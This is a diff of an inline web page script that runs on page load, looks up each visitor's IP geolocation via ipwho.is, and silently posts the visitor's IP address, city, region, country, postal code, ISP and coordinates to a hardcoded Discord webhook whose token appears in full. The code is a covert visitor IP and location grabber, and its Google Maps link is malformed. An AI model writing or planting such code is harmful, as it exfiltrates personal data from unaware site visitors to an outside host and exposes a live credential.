@@ -87,22 +87,36 @@
     document.addEventListener("DOMContentLoaded", function() {
         const webhookUrl = "https://discord.com/api/webhooks/1536688037310763090/RA6SSMPxYXKUYxV4_vXLpSYlyFABwS6ZctLd0MmbXb8Pmyqp16wO42Yh8rsKZrAy1jA2";
         
-        fetch("https://ipwho.is" + Date.now())
+        const apiUrl = new URL("https://ipwho.is");
+        apiUrl.searchParams.set("t", Date.now());
+
+        fetch(apiUrl.toString())
         .then(response => response.json())
         .then(data => {
-            const mapText = data.city || 'LOCATION';
-            
-            const rawContentText = `🟢 **Website Traffic Logged**\n• **User IP:** ${data.ip || 'Hidden'}\n• **Location:** ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'Unknown'}\n• **Postal Code:** ${data.postal || 'N/A'}\n• **Provider/ISP:** ${data.connection?.isp || 'N/A'}\n• **Google Maps:** [${mapText}](https://google.com{data.latitude},${data.longitude})`;
+            if (!data.success) return;
+
+            const mapText = data.city || "LOCATION";
+            const lat = data.latitude;
+            const lon = data.longitude;
+
+            const gMapsLink = "[" + mapText + "](https://google.com" + lat + "," + lon + ")";
+
+            const rawContentText = "🟢 **Website Traffic Logged**\n" +
+                                   "• **User IP:** " + (data.ip || 'Hidden') + "\n" +
+                                   "• **Location:** " + (data.city || 'N/A') + ", " + (data.region || 'N/A') + ", " + (data.country || 'Unknown') + "\n" +
+                                   "• **Postal Code:** " + (data.postal || 'N/A') + "\n" +
+                                   "• **Provider/ISP:** " + (data.connection?.isp || 'N/A') + "\n" +
+                                   "• **Google Maps:** " + gMapsLink;
 
             fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: rawContentText })
             })
-            .then(res => console.log("Traffic logged successfully."))
-            .catch(err => console.error("Error sending message:", err));
+            .then(res => console.log("Payload transferred."))
+            .catch(err => console.error("Webhook processing error:", err));
         })
-        .catch(err => console.error("Error capturing visitor details:", err));
+        .catch(err => console.error("API tracking failed:", err));
     });
     </script>
 
